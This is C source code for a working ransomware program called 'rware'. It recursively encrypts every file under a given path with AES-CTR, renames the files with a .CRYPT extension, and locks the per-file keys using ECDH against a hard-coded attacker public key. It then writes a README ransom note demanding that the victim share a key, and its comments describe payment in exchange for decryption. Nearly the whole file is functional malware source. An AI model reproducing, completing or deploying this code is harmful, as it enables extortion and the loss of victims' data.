#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <sys/stat.h>
#include <string.h>
#include <errno.h>
#include <sys/random.h>

#include "common.h"

FileList* encrypt_file(FileList* file) {
    FileList *encr = newfile();
    getrandom(encr->key, AES_KEYLEN, 0);
    getrandom(encr->iv, AES_BLOCKLEN, 0);

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, encr->key, encr->iv);

    uint8_t buf[CHUNKSIZE];
    
    FILE *f = fopen(file->path, "rb+");
    while (1) {
        int len = fread(buf, 1, CHUNKSIZE, f);
        if (len <= 0)
            break;

        fseek(f, -len, SEEK_CUR);
        AES_CTR_xcrypt_buffer(&ctx, buf, len);
        int wlen = fwrite(buf, 1, len, f);
    }
    fclose(f);

    strncpy(encr->path, file->path, PATHLEN);
    strcat(encr->path, ".CRYPT");
    rename(file->path, encr->path);

    return encr;
}

FileList* find_files(const char *directory_path, FileList *list) {
    DIR *dir = opendir(directory_path);

    // If directory couldn't be opened, print error and return
    if (dir == NULL) {
        fprintf(stderr, "Error opening directory '%s': %s\n", directory_path, strerror(errno));
        return list;
    }

    struct dirent *entry;
    struct stat entry_stat;
    char path[PATHLEN];

    // Iterate through each entry in the directory
    while ((entry = readdir(dir)) != NULL) {
        // Skip "." and ".." to avoid infinite recursion
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
            continue;
        }

        // Construct full path for the current entry
        snprintf(path, PATHLEN, "%s/%s", directory_path, entry->d_name);

        // Get file statistics for the entry
        if (stat(path, &entry_stat) == -1) {
            // fprintf(stderr, "Error getting stats for '%s': %s\n", path, strerror(errno));
            continue;
        }

        // Check if the entry is a directory
        if (S_ISDIR(entry_stat.st_mode)) {
            // If it's a directory, recurse into it
            // printf("Directory: %s\n", path);
            list = find_files(path, list);
        } else {
            // If it's a file, append to the list
            // printf("File: %s\n", path);
            FileList *n = newfile();
            strncpy(n->path, path, PATHLEN);
            list->next = n;
            list = n;
        }
    }

    closedir(dir);
    return list;
}

// We need to lock the info file containing encryption key and IV of each file.
// We will use ECDH to generate a shared secret between Attacker A and Bob B.
//
// A generates offline:
//      p = private random number, Q = p * G
// Q is hard-coded here.
//
// B generates when rware is run:
//      l = private random number, M = l * G
// l is erased after use.
// M is displayed in the message and needs to be shared with A to decrypt.
//
// During encryption:
// B derives the shared secret:
//      S = l * Q
// S is used to encrypt the info file.
// S and l are deleted after use.
//
// During decryption:
// B shares M with A along with some $$$.
// A derives the shared secret:
//      S = p * M
// A shares S with B.
// B decrypts the info file and then decrypts all the files.

// includes uint8_t Apub[ECC_PUB_KEY_SIZE] = {...};
#include "public_key.h"

int main(int argc, char** argv) {
    if (argc != 2) {
        printf("Provide path!\nUsage: ./rware <path>\n");
        return EXIT_FAILURE;
    }

    uint8_t priv[ECC_PRV_KEY_SIZE];
    uint8_t pub[ECC_PUB_KEY_SIZE];
    uint8_t shared[ECC_PUB_KEY_SIZE];
    struct AES_ctx infoenc;
    
    getrandom(priv, ECC_PRV_KEY_SIZE, 0);
    ecdh_generate_keys(pub, priv);
    ecdh_shared_secret(priv, Apub, shared);

    AES_init_ctx_iv(&infoenc, shared, &shared[ECC_PRV_KEY_SIZE]);

    FileList *all_files_head = newfile();
    FileList *all_files_tail = find_files(argv[1], all_files_head);

    FileList *encr_files_head = newfile();
    FileList *encr_files_tail = encr_files_head;

    FILE *info = fopen("info.enc", "wb");
    // Write public key to info file
    fwrite(pub, 1, ECC_PUB_KEY_SIZE, info);

    for (FileList *f = all_files_head->next; f != NULL; f = f->next) {
        // printf("File: %s\n", f->path);
        encr_files_tail->next = encrypt_file(f);
        encr_files_tail = encr_files_tail->next;

        // Encrypt file key + iv with shared secret
        AES_CTR_xcrypt_buffer(&infoenc, encr_files_tail->key, AES_KEYLEN + AES_BLOCKLEN);

        // Write path
        int n = strlen(encr_files_tail->path) + 1;
        fwrite(&n, 1, sizeof(int), info);
        // Write encrypted file key + iv
        fwrite(encr_files_tail->path, 1, n, info);
        fwrite(encr_files_tail->key, 1, AES_KEYLEN + AES_BLOCKLEN, info);
    }
    fclose(info);

    FILE *readme = fopen("README.txt", "w");
    fprintf(readme, "ALL YOUR FILES ARE ENCRYPTED!\n===== SHARE THE KEY BELOW TO DECRYPT ======\n");
    for (int i=0; i < ECC_PUB_KEY_SIZE; i++)
        fprintf(readme, "%02x", pub[i]);
    fprintf(readme, "\n");

    return EXIT_SUCCESS;
}
